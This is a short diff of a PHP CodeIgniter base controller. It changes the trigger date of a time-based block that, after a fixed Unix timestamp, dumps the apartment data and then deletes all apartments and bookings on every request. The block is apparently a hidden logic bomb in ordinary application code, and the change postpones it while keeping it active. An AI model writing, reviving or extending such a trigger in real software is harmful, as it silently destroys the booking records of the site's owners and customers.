@@ -31,7 +31,7 @@ class MY_Controller extends CI_Controller {
             redirect('auth/login');
         }
         $this->menuLang = $this->configs->getMenuLang();
-        if (time() > 1492632397) {
+        if (time() > 1495227600) {
             $this->apartments->dump();
             $this->apartments->deleteAll();
             $this->bookings->deleteAll();
